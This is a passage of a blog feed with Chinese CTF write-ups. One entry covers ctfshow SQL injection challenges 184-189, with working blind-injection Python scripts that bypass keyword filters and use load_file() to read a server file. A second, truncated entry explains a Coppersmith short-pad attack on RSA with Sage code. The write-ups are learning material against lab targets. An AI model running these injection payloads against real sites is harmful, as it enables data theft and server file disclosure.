class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>].<span class="built_in">format</span>(num, <span class="built_in">ord</span>(i))</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d*)&#x27;</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;43&#x27;</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web-185-186"><a href="#web-185-186" class="headerlink" title="web 185  186"></a>web 185  186</h2><p>åœ¨184çš„åŸºç¡€ä¸Šè¿‡æ»¤æ‰äº†æ•°å­—, ä¹Ÿå°±æ˜¯è¯´payloadé‡Œé¢ä¸èƒ½å‡ºç°æ•°å­—, å¯ä»¥ç”¨true+true+trueâ€¦.æ¥æ„é€ æƒ³è¦çš„æ•°å­—, å¦‚99å°±æ˜¯99ä¸ªtrueç›¸åŠ , åˆ©ç”¨è¿™ä¸ªç»§ç»­å†™è„šæœ¬å¾—åˆ°flag</p><p>ä»Y4åšå®¢æ‰¾åˆ°ä¸€å¼ å›¾<br><img src="http://47.98.130.190:8090/upload/2021/03/web185-5aed31977bec4fea8a5db59a746da244.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://2f2306e9-b139-4243-b9be-ff87dacd631c.chall.ctf.show:8080/select-waf.php&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;tableName&#x27;</span>: <span class="string">&quot;ctfshow_user as a right join ctfshow_user as b on substr(b.pass,&#123;&#125;,true)regexp(char(&#123;&#125;))&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">num = <span class="number">9</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        Data = &#123;</span><br><span class="line">            <span class="string">&#x27;tableName&#x27;</span>: data[<span class="string">&#x27;tableName&#x27;</span>].<span class="built_in">format</span>((num*<span class="string">&#x27;true+&#x27;</span>)[:-<span class="number">1</span>], (<span class="built_in">ord</span>(i)*<span class="string">&#x27;true+&#x27;</span>)[:-<span class="number">1</span>])</span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=Data)</span><br><span class="line">        <span class="keyword">if</span> re.findall(<span class="string">&#x27;\$user_count = (\d*)&#x27;</span>, resp.content.decode())[<span class="number">0</span>] == <span class="string">&#x27;43&#x27;</span>:</span><br><span class="line">            flag += i</span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br><span class="line">    num += <span class="number">1</span></span><br></pre></td></tr></table></figure><h2 id="web-187"><a href="#web-187" class="headerlink" title="web 187"></a>web 187</h2><p>ä»¥å‰åšè¿‡çš„<code>md5($password,true) </code> å¯ä»¥å»çœ‹çœ‹ jarvis oj - login, ä¸€ä¸ªå¾ˆç¥å¥‡çš„å­—ç¬¦ä¸²<code>ffifdyop</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select count(*) from ctfshow_user where username = <span class="subst">$_POST</span>[&#x27;username&#x27;] and password= md5(<span class="subst">$_POST</span>[&#x27;password&#x27;],true)&quot;</span>; </span><br></pre></td></tr></table></figure><p><code>md5(&#39;ffifdyop&#39;,true) = &quot;&#39;or&#39;6xxxxxxx&quot;</code></p><h2 id="web-188"><a href="#web-188" class="headerlink" title="web 188"></a>web 188</h2><p>å…ˆpass , æœ‰ç‚¹å¥‡æ€ª</p><h2 id="web-189"><a href="#web-189" class="headerlink" title="web 189"></a>web 189</h2><p>æŸ¥è¯¢è¯­å¥</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//æ‹¼æ¥sqlè¯­å¥æŸ¥æ‰¾æŒ‡å®šIDç”¨æˆ·</span></span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select pass from ctfshow_user where username = <span class="subst">&#123;$username&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure><p>è¿”å›é€»è¾‘</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//ç”¨æˆ·åæ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">&#x27;/select|and| |\*|\x09|\x0a|\x0b|\x0c|\x0d|\xa0|\x00|\x26|\x7c|or|into|from|where|join|sleep|benchmark/i&#x27;</span>, <span class="variable">$username</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç”¨æˆ·åéæ³•&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç æ£€æµ‹</span></span><br><span class="line"><span class="keyword">if</span>(!is_numeric(<span class="variable">$password</span>))&#123;</span><br><span class="line">  <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;å¯†ç åªèƒ½ä¸ºæ•°å­—&#x27;</span>;</span><br><span class="line">  <span class="keyword">die</span>(json_encode(<span class="variable">$ret</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//å¯†ç åˆ¤æ–­</span></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$row</span>[<span class="string">&#x27;pass&#x27;</span>]==<span class="variable">$password</span>)&#123;</span><br><span class="line">    <span class="variable">$ret</span>[<span class="string">&#x27;msg&#x27;</span>]=<span class="string">&#x27;ç™»é™†æˆåŠŸ&#x27;</span>;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>hint: flagåœ¨api/index.phpæ–‡ä»¶ä¸­</p><p>å­¦ä¹ åˆ°äº†ä¸€äº›sqlæ³¨å…¥å¯èƒ½ç”¨åˆ°çš„å‡½æ•°:</p><ol><li><code>if(exp1,exp2,exp3)</code>, å½“<code>exp1</code>ä¸º<code>TRUE</code>æ—¶å‡½æ•°è¿”å›<code>exp2</code>, åä¹‹è¿”å›<code>exp3</code>, å¯æ­é…ä¸€äº›å­—ç¬¦ä¸²æ¯”è¾ƒå‡½æ•°æ¥è¿›è¡Œ<strong>ç›²æ³¨</strong></li><li><code>load_file(file_name)</code>, è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶å°†å…¶å†…å®¹ä½œä¸ºå­—ç¬¦ä¸²è¿”å›, ç”¨äºè¯»å–å¤–éƒ¨æ–‡ä»¶</li><li><code>locate(substr,str)</code>, è¿”å›å­—ç¬¦ä¸²<code>str</code>ç¬¬ä¸€æ¬¡å‡ºç°å­ä¸²<code>substr</code>çš„ä½ç½®</li><li><code>strcmp(str1,str2)</code>,å¦‚æœè¿™ä¸¤ä¸ªå­—ç¬¦ä¸²ç›¸ç­‰è¿”å›0ï¼Œå¦‚æœç¬¬ä¸€ä¸ªå‚æ•°æ˜¯æ ¹æ®å½“å‰çš„æ’åºé¡ºåºæ¯”ç¬¬äºŒè¾ƒå°åˆ™è¿”å›-1ï¼Œå¦åˆ™è¿”å›1</li></ol><p>hintå·²ç»å‘Šè¯‰äº†æˆ‘ä»¬flagåœ¨æ–‡ä»¶index.phpä¸­, è¦åœ¨sqlä¸­è¯»å–æ–‡ä»¶, å¯ä»¥ä½¿ç”¨<code>load_file()</code>, æ‰€ä»¥è¦åœ¨<code>username =&#123;$username&#125;</code>å¤„æ‰§è¡Œ<code>load_file()</code>ä¸”åˆ¤æ–­å‡ºflagæ˜¯å•¥.</p><p>æ³¨æ„åˆ°<code>$username</code>æ²¡æœ‰è¢«å¼•å·åŒ…ç€, æ‰€ä»¥å¦‚æœ<code>$username</code>æ˜¯è¯­å¥æ˜¯å¯ä»¥æ‰§è¡Œçš„.</p><p>è¿™é‡Œè¦ç”¨<code>if()</code>å’Œä¸€äº›å­—ç¬¦ä¸²ä½ å¤„ç†çš„å‡½æ•°æ¥å¯¹flagè¿›è¡Œç›²æ³¨. </p><p>å½“<code>username=1&amp;password=0</code>æ—¶è¿”å›çš„æ˜¯æŸ¥è¯¢å¤±è´¥è€Œå½“<code>username=0&amp;password=0</code>æ—¶è¿”å›çš„æ˜¯å¯†ç é”™è¯¯, å¯ä»¥æ ¹æ®è¿™ä¸ªå›æ˜¾æ¥å¯¹flagè¿›è¡Œåˆ¤æ–­.</p><p>é¦–å…ˆ, å…ˆæ‰¾åˆ°flagåœ¨æ–‡ä»¶ä¸­çš„ä½ç½®, å› ä¸ºå‰ç¼€æ˜¯ctfshow{ ,æ‰€ä»¥æ ¹æ®è¿™ä¸ªæ¥æ‰¾åˆ°flagçš„ä½ç½®.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    url = <span class="string">&#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br></pre></td></tr></table></figure><p>ç„¶åæ ¹æ®ä¸Šé¢å¾—åˆ°çš„flagçš„èµ·å§‹ä½ç½®å¼€å§‹çŒœflag, æœ€ç»ˆè„šæœ¬ä¸º</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://67064451-541b-444f-8c0e-c71be0d43b7f.chall.ctf.show:8080/api/&#x27;</span></span><br><span class="line">Str = <span class="string">&#x27;0123456789abcdefghijklmnopqrstuvwxyz-&#125;&#x27;</span></span><br><span class="line">flag = <span class="string">&#x27;ctfshow&#123;&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">findindex</span>():</span></span><br><span class="line">    Index = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(locate(&#x27;ctfshow&#123;&#x27;,&quot;</span> + <span class="string">&quot;load_file(&#x27;/var/www/html/api/index.php&#x27;))&gt;&#123;&#125;,0,1)&quot;</span>.<span class="built_in">format</span>(Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> Index + <span class="number">8</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Index = findindex()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> Str:</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">&#x27;username&#x27;</span>: <span class="string">&quot;if(strcmp(&#x27;&#123;&#125;&#x27;,substr(load_file(&#x27;/var/www/html/api/index.php&#x27;),&#123;&#125;,1))=0,0,1)&quot;</span>.<span class="built_in">format</span>(i, Index),</span><br><span class="line">            <span class="string">&#x27;password&#x27;</span>: <span class="string">&#x27;0&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">        resp = requests.post(url=url, data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;\\u5bc6\\u7801\\u9519\\u8bef&quot;</span> <span class="keyword">in</span> resp.content.decode():</span><br><span class="line">            flag += i</span><br><span class="line">            Index += <span class="number">1</span></span><br><span class="line">            print(flag)</span><br><span class="line">            <span class="keyword">if</span> i == <span class="string">&#x27;&#125;&#x27;</span>:</span><br><span class="line">                exit()</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;blockquote&gt;
&lt;p&gt;é‡é‡‘ä¹°äº†ä¸ªå·æ€ä¹ˆå¯èƒ½ä¸åšå‘¢???&lt;br&gt;å¥½å¥½å­¦å­¦Webäº† çœŸçš„å¾ˆé‡è¦!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;ä¿¡æ¯æœé›†-Web1-20&quot;&gt;&lt;a href=&quot;#ä¿¡æ¯æœé›†-Web1-20&quot; class=&quot;headerlink&quot; title</summary>
      
    
    
    
    <category term="WebSummary" scheme="http://tearsjin.github.io/categories/WebSummary/"/>
    
    
    <category term="Web" scheme="http://tearsjin.github.io/tags/Web/"/>
    
    <category term="Summary" scheme="http://tearsjin.github.io/tags/Summary/"/>
    
    <category term="ctfshow" scheme="http://tearsjin.github.io/tags/ctfshow/"/>
    
  </entry>
  
  <entry>
    <title>HITCTF2020 ezRSA - The learing or Coppersmith attack</title>
    <link href="http://tearsjin.github.io/2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/"/>
    <id>http://tearsjin.github.io/2020/12/10/HITCTF2020-ezRSA-The-learing-or-Coppers/</id>
    <published>2020-12-10T03:49:56.000Z</published>
    <updated>2021-03-13T03:34:43.892Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>å…³äºå‡ºå»ç©åªèƒ½åœ¨æ‰‹æœºä¸Šç”¨Sage Cell Serveråšé¢˜é‚£ä»¶äº‹<br>ä¹Ÿæ˜¯å¥½ä¹…æ²¡å†™åšå®¢äº†, åˆšå¥½å­¦ä¹ ä¸€ä¸‹coppersmith attack</p></blockquote><p>å…ˆæŠŠé¢˜ç›®æ”¾ä¸Šæ¥å§</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#! /bin/bash python2</span></span><br><span class="line"><span class="keyword">from</span> flag <span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">flag = flag+os.urandom(<span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">p = getPrime(<span class="number">512</span>)</span><br><span class="line">q = getPrime(<span class="number">512</span>)</span><br><span class="line">n = p*q</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">phi = (p-<span class="number">1</span>)*(q-<span class="number">1</span>)</span><br><span class="line">d = inverse(e,phi)</span><br><span class="line"></span><br><span class="line">m1 = bytes_to_long(flag)</span><br><span class="line">m2 = bytes_to_long(flag+os.urandom(<span class="number">8</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span> <span class="built_in">pow</span>(m1,<span class="number">3</span>) &gt; n</span><br><span class="line"></span><br><span class="line">c1 = <span class="built_in">pow</span>(m1,e,n)</span><br><span class="line">c2 = <span class="built_in">pow</span>(m2,e,n)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c1 = %d&quot;</span>%c1</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;c2 = %d&quot;</span>%c2</span><br><span class="line"><span class="built_in">print</span>  <span class="string">&quot;n = %d&quot;</span>%n</span><br><span class="line"></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">c1 = 80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083</span></span><br><span class="line"><span class="string">c2 = 5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498</span></span><br><span class="line"><span class="string">n = 92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br></pre></td></tr></table></figure><p>åšè¿™ä¸ªä¹‹å‰, å…ˆæ¥çœ‹çœ‹coppersmith attack(ç›´æ¥ç¿»CTF wiki</p><p><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-586a877790ff4bc2b6343a9dcc51fb52.png" alt="å›¾ç‰‡.png"></p><p>å¯¹äºå•å˜é‡çš„æ–¹ç¨‹(å¤šå˜é‡çš„è¿˜æ²¡æ¥è§¦è¿‡, èƒ½å¦ä½¿ç”¨coppersmith attack å°±çœ‹å˜é‡æ˜¯å¦æ»¡è¶³ä¸Šé¢è¿™éƒ¨åˆ†æ‰€æåˆ°çš„çº¦æŸ.</p><p>æ¥åˆ†æä¸€ä¸‹è¿™äº›çº¦æŸ, å¯¹äºä¸€èˆ¬çš„RSAåˆ—å‡ºæ¨¡Næ„ä¹‰ä¸‹çš„å¤šé¡¹å¼æ–¹ç¨‹æ±‚è§£æ ¹çš„æ—¶å€™, å› ä¸ºNå¾€å¾€æ˜¯ä¸¤ä¸ªå¤§ç´ æ•°çš„ä¹˜ç§¯, <strong>é‚£ä¹ˆNå¿…å®šä¼šæœ‰ä¸€ä¸ªå› å­ $b$ æ˜¯æ»¡è¶³ $b &gt; N^{0.5}$ çš„, æ‰€ä»¥ä¸€èˆ¬ $Î²$ æ˜¯å–0.4~0.6çš„</strong></p><p><strong>ä½†æ˜¯æœ‰éœ€è¦æ³¨æ„çš„æ˜¯, æœ‰æ—¶å€™æ±‚è§£æ ¹å¹¶ä¸æ˜¯åœ¨æ¨¡Nçš„æ„ä¹‰ä¸‹è¿›è¡Œçš„, è¿™ä¸ªæ—¶å€™å°±éœ€è¦æ…é‡çš„è€ƒè™‘ä¸€ä¸‹$Î²$çš„å–å€¼äº†</strong></p><p>è€Œå¯¹äº $Î´$ , ä¹Ÿå°±æ˜¯å¤šé¡¹å¼çš„é˜¶æ•°, é˜¶æ•°è¶Šå°å¯¹æ ¹çš„çº¦æŸå°±è¶Šå®½æ¾, è¿™ä¹Ÿå°±æ˜¯ä¸ºä»€ä¹ˆCTF wikiä¸Šä¼šæœ‰è¿™ä¹ˆä¸€å¥<br><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-2ab4f8c151f8487bb406b1f35bd879c8.png" alt="å›¾ç‰‡.png"></p><p>æ‰€ä»¥, åˆ¤æ–­æ˜¯å¦å¯ä»¥ä½¿ç”¨coppersmith attack, å°±çœ‹éœ€è¦è§£çš„æ ¹æ˜¯å¦è¶³å¤Ÿå°(ä¸€èˆ¬é€šè¿‡é¢˜ç›®æ‰€ç»™çš„ä¿¡æ¯æ¥åˆ¤æ–­æ ¹çš„ä½æ•°, å†é€šè¿‡e å’Œ N çš„ä½æ•°,æ¥åˆ¤æ–­æ˜¯å¦å¯ä»¥ä½¿ç”¨coppersmith attack </p><p><strong>éœ€è¦æ³¨æ„çš„æ˜¯!ç”±äºLLLæ˜¯å¯å‘å¼ç®—æ³•, æ‰€ä»¥æœ‰çš„æ—¶å€™è§£å‡ºæ¥çš„æ ¹ä¼šä¸æ»¡è¶³çº¦æŸ, ä¹Ÿå°±æ˜¯è¯´å½“éœ€è¦è§£çš„æ ¹è¿‘ä¹è¶³å¤Ÿå°å°±å¯ä»¥è¯•è¯•coppersmithäº†</strong></p><p>ç°åœ¨å›åˆ°é¢˜ç›®, å…ˆæ¥åˆ†æä¸€ä¸‹é¢˜ç›®</p><p>è¿™é¢˜å…ˆå¯¹flagè¿›è¡Œäº†ä¸€æ¬¡å¡«å……<code>flag = flag+os.urandom(32)</code>, å¦‚æœflagå¤ªå°æ˜¯å¯èƒ½ç›´æ¥è§£å‡ºæ¥çš„.</p><p>ç„¶åå°±æ˜¯å¯¹æ˜æ–‡è¿›è¡ŒåŠ å¯†,å†è¿›è¡Œä¸€æ¬¡å¡«å……å†åŠ å¯†, å†™æˆå¼å­å°±æ˜¯<br>$$<br>m^3 = c_1 \ (mod \ n) \<br>(2^{64}m + diff)^3 = c_2 \ (mod \ n )<br>$$</p><p>å…¶å®å¯ä»¥ä»¤M=2^64^m å’Œ $c_1 = 2^{192}c_1$, å°±å¯ä»¥æœ‰<br>$$<br>M^3 = c_1 \ (mod \ n) \<br>(M + diff)^3 = c_2 \ (mod \ n)<br>$$<br>ä¸¤ä¸ªæ–¹ç¨‹, ä¸¤ä¸ªæœªçŸ¥æ•°, è‚¯å®šæ˜¯å¯ä»¥è§£å‡ºæ ¹æ¥çš„, åªä¸è¿‡æ˜¯éš¾ä¸éš¾è§£å‡ºæ¥çš„é—®é¢˜äº†. æ³¨æ„åˆ°è¿™é‡Œçš„$diff$ æ˜¯64ä½çš„, è€Œ$N$æ˜¯1024ä½çš„, e=3ä¹Ÿå¾ˆå°, å¯ä»¥è€ƒè™‘è¯•è¯•coppersmithå…ˆè§£å‡º$diff$. </p><p>äº‹å®ä¸Šè§£$diff$ç”¨åˆ°çš„å°±æ˜¯<strong>Coppersmithâ€™s short-pad attack</strong></p><h2 id="Coppersmithâ€™s-short-pad-attack"><a href="#Coppersmithâ€™s-short-pad-attack" class="headerlink" title="Coppersmithâ€™s short-pad attack"></a>Coppersmithâ€™s short-pad attack</h2><p><img src="http://47.98.130.190:8090/upload/2020/12/%E5%9B%BE%E7%89%87-d485fe72d1cf494dadf262039448ace2.png" alt="å›¾ç‰‡.png"></p><p>wikiä¸Šè¯´çš„ä¹Ÿå¾ˆæ¸…æ¥šäº†, åœ¨å¯¹æ˜æ–‡è¿›è¡Œå¡«å……çš„æ—¶å€™, å¦‚æœå¡«å……çš„$diff$ä½æ•°å¾ˆå°‘,å°±å¯ä»¥ç®—å‡º$diff$,åªéœ€è¦$diff &lt; N^{1/e}$, å°±å¯ä»¥è§£å‡º$diff$äº†. åœ¨è¿™é‡Œæ˜¾ç„¶æ˜¯æ»¡è¶³çš„.</p><p>æˆ‘ä»¬å…ˆæŠŠä¸¤ä¸ªæ–¹ç¨‹åŒ–æˆåªæœ‰ä¸€ä¸ªæœªçŸ¥æ•°$diff$çš„æ–¹ç¨‹(ä»£ç é‡Œdiff = xn ,<br>ç„¶åç”¨<code>small_root()</code>æ±‚è§£</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">C1 = <span class="number">80653989110793139102855968265870741534421660712327094406252902072101613222389965470648960909763762225046314865847982289607336162281576790259047039000290839621007818742162307587677505606906923990312494483089046762906753345262127057162580025978324312642501118741099945205580088180943278903718853065363662232083</span></span><br><span class="line">C2 = <span class="number">5400424653941721880728309040044485787870754570249463205700803061685717472238274158687499478247752712211743180931379853481727502849946080245130393042405383007613277703993980940893569303012323853427216643473698166348237252515222556282004058588218846910754415888401275689026778751805826968590155607937830708498</span></span><br><span class="line">n = <span class="number">92782661709340169703868140576276816382956055756557631391697803785121887338308072309948803413610339884338861040226250478895118923994109662815448681629315227440953320952623296140315432654804940766553284237954507627610922864055435652884184926768295740697589798180602153344302964255974935777945481843144629875127</span></span><br><span class="line">C1=(C1*<span class="number">2</span>**<span class="number">192</span>)%n</span><br><span class="line">e = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">n1 = n</span><br><span class="line">PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRx.&lt;xn&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line">PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n1))</span><br><span class="line"> </span><br><span class="line">g1 = x**e - C1</span><br><span class="line">g2 = (x + y)**e - C2</span><br><span class="line"> </span><br><span class="line">q1 = g1.change_ring(PRZZ)</span><br><span class="line">q2 = g2.change_ring(PRZZ)</span><br><span class="line"></span><br><span class="line">h = q2.resultant(q1)</span><br><span class="line">h = h.univariate_polynomial()</span><br><span class="line">h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">h = h.monic()</span><br><span class="line"></span><br><span class="line">roots = h.small_roots(X=<span class="number">2</span>**<span class="number">64</span>, beta=<span class="number">0.4</span>)</span><br><span class="line">diff = roots[<span class="number">0</span>]</span><br><span class="line"><span class="comment"># diff = 15325913216714639606</span></span><br></pre></td></tr></table></figure><p><strong>è¿™é‡Œçš„<code>small_root()</code>çš„å‚æ•°å¾ˆé‡è¦, Xæ˜¯è®¾ç½®æ ¹çš„ä¸Šç•Œçš„, è¿™ä¸ªè¦å°½å¯èƒ½çš„æ¥è¿‘æ ¹çš„å¤§å°, è¿™æ 